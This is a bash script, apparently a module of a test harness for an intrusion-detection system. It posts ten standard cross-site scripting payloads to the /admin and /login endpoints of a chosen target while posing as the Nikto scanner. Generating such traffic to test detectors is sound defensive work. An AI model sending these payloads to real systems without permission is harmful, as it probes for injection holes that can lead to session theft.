#!/usr/bin/env bash
# Module 04: XSS Probe
# Sends Cross-Site Scripting payloads — triggers HIGH alert in IntruSense

TARGET_IP="${TARGET_IP:-$1}"
PORT="${TARGET_PORT:-8080}"
[[ -z "$TARGET_IP" ]] && { echo "TARGET_IP not set"; exit 1; }

BASE="http://$TARGET_IP:$PORT"
UA="Mozilla/5.0 (compatible; Nikto/2.1.6)"

XSS_PAYLOADS=(
  "<script>alert(1)</script>"
  "<script>alert(document.cookie)</script>"
  "javascript:alert(1)"
  "<img src=x onerror=alert(1)>"
  "<svg onload=alert(1)>"
  "<body onload=alert(1)>"
  "\"><script>alert(document.domain)</script>"
  "';alert(String.fromCharCode(88,83,83))//'"
  "<iframe src=javascript:alert(1)>"
  "<input onfocus=alert(1) autofocus>"
)

echo "[04] Starting XSS probes against $BASE"

for payload in "${XSS_PAYLOADS[@]}"; do
  echo "[04] Testing XSS payload: ${payload:0:40}..."
  # Encode the payload for POST
  enc_payload=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload" 2>/dev/null || echo "$payload")

  curl -s -o /dev/null \
    --connect-timeout 3 \
    -A "$UA" \
    -X POST \
    -d "username=${enc_payload}&password=test&comment=${enc_payload}" \
    "$BASE/admin" 2>/dev/null || true

  curl -s -o /dev/null \
    --connect-timeout 3 \
    -A "$UA" \
    -X POST \
    -d "search=${enc_payload}&q=${enc_payload}" \
    "$BASE/login" 2>/dev/null || true

  sleep 0.3
done

echo "[04] XSS probe complete — ${#XSS_PAYLOADS[@]} payloads sent"
